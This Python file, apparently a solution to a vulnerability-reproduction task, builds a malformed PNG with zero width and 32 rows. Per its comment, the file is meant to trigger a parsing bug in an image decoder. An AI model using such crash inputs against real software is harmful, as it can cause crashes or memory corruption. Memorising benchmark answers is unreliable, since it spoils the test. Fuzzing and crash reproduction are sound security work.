import struct
import binascii
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
            length = struct.pack("!I", len(data))
            crc = binascii.crc32(chunk_type + data) & 0xFFFFFFFF
            return length + chunk_type + data + struct.pack("!I", crc)

        # PNG signature
        signature = b"\x89PNG\r\n\x1a\n"

        # Image dimensions: zero width, non-zero height to trigger the bug
        width = 0
        height = 32  # at least one row so decompression occurs

        bit_depth = 8
        color_type = 2  # Truecolor RGB
        compression = 0
        filter_method = 0
        interlace_method = 0

        ihdr_data = struct.pack(
            "!IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression,
            filter_method,
            interlace_method,
        )
        ihdr_chunk = make_chunk(b"IHDR", ihdr_data)

        # Uncompressed image data: one filter byte per row, no pixel data since width = 0
        raw_scanlines = b"\x00" * height
        compressed_idat = zlib.compress(raw_scanlines, level=9)
        idat_chunk = make_chunk(b"IDAT", compressed_idat)

        iend_chunk = make_chunk(b"IEND", b"")

        return signature + ihdr_chunk + idat_chunk + iend_chunk